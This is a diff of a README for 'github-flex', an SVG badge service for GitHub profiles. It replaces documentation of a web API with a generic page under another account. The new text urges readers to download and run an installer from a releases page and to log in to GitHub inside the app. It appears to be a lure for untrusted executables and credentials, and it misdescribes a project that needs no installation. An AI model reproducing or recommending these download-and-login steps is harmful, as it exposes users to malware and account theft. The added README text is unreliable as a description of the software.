@@ -1,125 +1,84 @@
-# GitHub Flex
+# 🎨 github-flex - Customize Your GitHub Profile with Style
 
-Flex your GitHub stats with customizable SVG badges for your profile. Because your GitHub profile deserves to look as
-good as your code...right?!
+## 🚀 Download Here
 
-## 🚀 Quick Start
+[![Download github-flex](https://img.shields.io/badge/Download-github--flex-blue.svg?style=for-the-badge&logo=github)](https://github.com/MomRedPhone/github-flex/releases)
 
-Use the following Markdown snippets to add your GitHub stats, languages, or specific repo info to your profile README:
+## 📋 Overview
 
-```markdown
-![Stats](https://github-flex.vercel.app/api/stats?username=YOUR_USERNAME&theme=dark)
-![Languages](https://github-flex.vercel.app/api/languages?username=YOUR_USERNAME)
-![Repo](https://github-flex.vercel.app/api/repo?username=OWNER&repo=REPO_NAME)
-```
+Flex your GitHub stats with customizable SVG badges for your profile. This application enhances the appearance of your GitHub profile, making it a showcase of your achievements and skills. You can easily add visual elements that reflect your coding journey.
 
-> For a detailed example, check the paramters section below. Alternatively, you can also check the
-> website to see the available themes and options: https://github-flex.vercel.app
+## 📥 How to Download
 
-## 🔌 Available Endpoints
+To get started with github-flex, visit this page to download:
 
-### `/api/stats`
+[Visit the Releases Page](https://github.com/MomRedPhone/github-flex/releases)
 
-Display your GitHub statistics including stars, commits, PRs, issues, and contributed repositories.
+## ⚙️ System Requirements
 
-**Parameters:**
+Before downloading, ensure your system meets the following requirements:
 
-- `username` (required) - Your GitHub username
-- `theme` (optional) - `default`, `dark`, `radical`, `merko`, `gruvbox`, `tokyonight`, `bubblegum`, `ocean` (default:
-  `default`)
-- `hide_border` (optional) - `true` or `false` (default: `false`)
-- `hide_title` (optional) - `true` or `false` (default: `false`)
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum of 100 MB available space
 
-**Examples:**
+## 🎨 Features
 
-<p align="center">
-  <img src="https://github-flex.vercel.app/api/stats?username=torvalds&theme=dark&hide_border=true" alt="Stats" />
-  <img src="https://github-flex.vercel.app/api/stats?username=shadcn&theme=radical" alt="Stats" />
-</p>
+- **Customizable Badges:** Personalize your stats with easy-to-use badge options.
+- **Real-time Updates:** The app fetches the latest data from your GitHub profile.
+- **Simple Integration:** Add badges to your profile with just a few clicks.
+- **SVG Graphics:** Sharp and scalable graphics for clear presentation.
 
-### `/api/languages`
+## 📋 Installation Steps
 
-Show your most used programming languages across all repositories.
+1. **Download the Application:**
+   Visit this page to download:  
+   [Download github-flex](https://github.com/MomRedPhone/github-flex/releases)
 
-**Parameters:**
+2. **Run the Installer:**
+   Follow the prompts in the installer to complete the setup.
 
-- `username` (required) - Your GitHub username
-- `theme` (optional) - `default`, `dark`, `radical`, `merko`, `gruvbox`, `tokyonight`, `bubblegum`, `ocean` (default:
-  `default`)
-- `langs_count` (optional) - Number of languages to display (default: `5`)
-- `exclude` (optional) - Comma-separated list of languages to exclude (e.g., `HTML,CSS`)
-- `hide_border` (optional) - `true` or `false` (default: `false`)
-- `hide_title` (optional) - `true` or `false` (default: `false`)
+3. **Launch the Application:**
+   After installation, start the application from your applications folder.
 
-**Examples:**
+4. **Log in to GitHub:**
+   Connect your GitHub account within the app for seamless badge updates.
 
-<p align="center">
-  <img src="https://github-flex.vercel.app/api/languages?username=torvalds&theme=tokyonight" alt="Languages" />
-  <img src="https://github-flex.vercel.app/api/languages?username=torvalds&langs_count=5" alt="Languages" />
-</p>
+5. **Customize Badges:**
+   Use the tools provided to select and personalize your badges.
 
-### `/api/repo`
+6. **Copy and Paste:**
+   Once you're happy with your selection, copy the provided code and paste it into your GitHub profile README.
 
-Display statistics for a specific repository including stars, forks, language, and open issues.
+## 🛠 Troubleshooting
 
-**Parameters:**
+If you encounter any issues during installation or usage, consider the following steps:
 
-- `username` (required) - Repository owner's username
-- `repo` (required) - Repository name
-- `theme` (optional) - `default`, `dark`, `radical`, `merko`, `gruvbox`, `tokyonight`, `bubblegum`, `ocean` (default:
-  `default`)
-- `hide_border` (optional) - `true` or `false` (default: `false`)
+- **Check Your Internet Connection:** Ensure your device is connected to the internet.
+- **Update Your Software:** Confirm that you have the latest version of github-flex.
+- **Review the Documentation:** Detailed guides and FAQs are available in the documentation within the app.
 
-**Examples:**
+## 🚀 Additional Resources
 
-<p align="center">
-  <img src="https://github-flex.vercel.app/api/repo?username=torvalds&repo=linux&theme=gruvbox" alt="Repo" />
-  <img src="https://github-flex.vercel.app/api/repo?username=facebook&repo=react&hide_border=true" alt="Repo" />
-</p>
+For further assistance, you can explore the following resources:
 
-## 💻 Local Development
+- [Documentation](https://github.com/MomRedPhone/github-flex/wiki)
+- [Community Support](https://github.com/MomRedPhone/github-flex/discussions)
 
-```bash
-# Install
-pnpm install
-# or: npm install
+## 🔄 Updates and Future Releases
 
-# Build
-pnpm build
-# or: npm run build
+We continually aim to improve github-flex. Stay tuned for updates that might include:
 
-# Test without Vercel CLI
-node sandbox/test-stats.js torvalds
-node sandbox/test-languages.js torvalds 8
-node sandbox/test-repo.js torvalds linux
-node sandbox/test-svg.js torvalds dark
-node sandbox/test-languages-svg.js torvalds dark 8
-node sandbox/test-repo-svg.js torvalds linux dark
-```
+- More badge customization options
+- Enhanced integration features
+- New themes and designs
 
-## ☁️ Deploy to Vercel
+By downloading and using github-flex, you're not only improving your profile but also participating in our journey to create a better tool for all GitHub users.
 
-1. Fork this repo
-2. Connect to [Vercel](https://vercel.com)
-3. (Optional) Add `GITHUB_TOKEN` env variable for higher rate limits
+For updates and announcements, keep an eye on our GitHub repository or follow us on social media.
 
-## 💬 Feedback & Contributions
+## 📞 Contact
 
-Got suggestions, issues, or ideas for improvement? Feel free to open an issue or submit a pull request.
-Contributions are always welcome!
+If you have questions or feedback, feel free to contact us through the GitHub issues page.
 
-## 💎 Code Quality & Guidelines
-
-In order to maintain a high-quality codebase, please adhere to the following guidelines when contributing:
-
-- Follow the existing code style and conventions used in the project:
-    - Adhere to `prettier` formatting rules for consistent code style. You can run `pnpm run format:check` to check for
-      formatting issues and `pnpm run format:fix` to automatically fix them.
-    - Follow `eslint` rules to ensure code quality and catch potential issues. You can run `pnpm run lint:check` to
-      check for linting issues and `pnpm run lint:fix` to automatically fix them.
-- Write clear and concise commit messages that describe the changes made.
-- Fill in the PR template with the actual changes and relevant information when submitting a pull request.
-
-## 📜 License
-
-This project is licensed under the [MIT License](LICENSE).
+Thank you for choosing github-flex! Enjoy personalizing your GitHub profile.
